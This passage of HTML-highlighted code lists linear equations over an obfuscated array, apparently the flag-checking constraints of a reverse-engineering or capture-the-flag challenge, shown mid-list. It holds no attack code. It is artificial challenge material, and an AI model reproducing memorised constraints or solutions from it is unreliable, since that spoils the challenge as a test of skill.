class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">15</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">18</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">6893</span><span class="token punctuation">,</span>
         <span class="token number">29</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">9</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">93</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">33</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">65</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">36</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">16</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">68</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">33</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">14</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1883</span><span class="token punctuation">,</span>
         <span class="token number">69</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">77</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">93</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">12</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">19</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">8</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">38</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">16</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">8257</span><span class="token punctuation">,</span>
         <span class="token number">23</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">11</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">18</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">26</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">16</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">5847</span><span class="token punctuation">,</span>
         <span class="token number">24</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">15</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">146</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">50</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">27</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">45</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">17</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">18257</span><span class="token punctuation">,</span>
         <span class="token number">25</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">89</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">19</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">44</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">150</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">250</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">166</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">126</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">11</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">690</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">207</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">18</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">12591</span><span class="token punctuation">,</span>
         <span class="token number">5</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">160</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">15</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">20</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">690</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">20</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">18</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">19</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">52041</span><span class="token punctuation">,</span>
         <span class="token number">29</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">26</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">60</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">90</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">16</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">21</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">12</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">20</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">46</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">65</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">20</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">20253</span><span class="token punctuation">,</span>
         <span class="token number">45</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">56</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">650</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">900</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">44</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">21</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">12</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">406</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">651</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">10</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">18768</span><span class="token punctuation">,</span>
         <span class="token number">555</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">6666</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">70</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">510</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">90</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">499</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">610</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">221</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">23</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">102</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2050</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">406</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">665</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">333</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">100</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">609</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">777</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">201</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">22</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">111844</span><span class="token punctuation">,</span>
